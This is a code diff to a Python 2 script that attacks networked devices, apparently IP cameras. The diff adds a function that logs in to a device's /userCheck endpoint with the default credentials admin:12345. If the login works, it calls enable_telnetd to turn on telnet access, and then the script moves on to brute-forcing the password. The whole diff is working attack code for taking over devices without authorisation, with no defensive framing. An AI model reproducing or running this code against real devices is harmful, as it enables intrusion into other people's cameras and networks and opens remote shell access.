@@ -31,6 +31,20 @@ def do_brute(path):
 		enable_telnetd(header,path)
 		return
 		
+def do_default(host,path):
+
+	header = base64.b64encode("admin:12345")
+        url = urllib2.Request("http://"+host+""+path+"/userCheck")
+	url.add_header('Authorization', "Basic " + header)
+        response = urllib2.urlopen(url)
+	print "[*] Testing: 12345"
+	if "<statusString>OK</statusString>" in response.read():
+		password = "12345"
+		print "[*] Found Password: 12345"
+		enable_telnetd(header,path)
+		return
+	
+		
 def detect_system(host):
 	
 	try:
@@ -92,4 +106,5 @@ if __name__ == '__main__':
 	password = ""
 	host = sys.argv[1]
 	path = detect_system(host)
+	do_default(host,path)
 	do_brute(path)
